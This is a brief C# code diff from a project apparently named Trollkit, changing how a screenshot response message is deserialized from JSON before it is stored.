@@ -145,7 +145,8 @@ namespace Trollkit_Library.ViewModels
 					}		
 					else if (model.Command == "ScreenshotResponse")
 					{
-						c.SetScreenshot(model.Value);
+						ScreenshotModel screenshotObject = JsonConvert.DeserializeObject<ScreenshotModel>(model.Value);
+						c.SetScreenshot(screenshotObject);
 					}
 					else if(model.Command == "ScreenList")
 					{
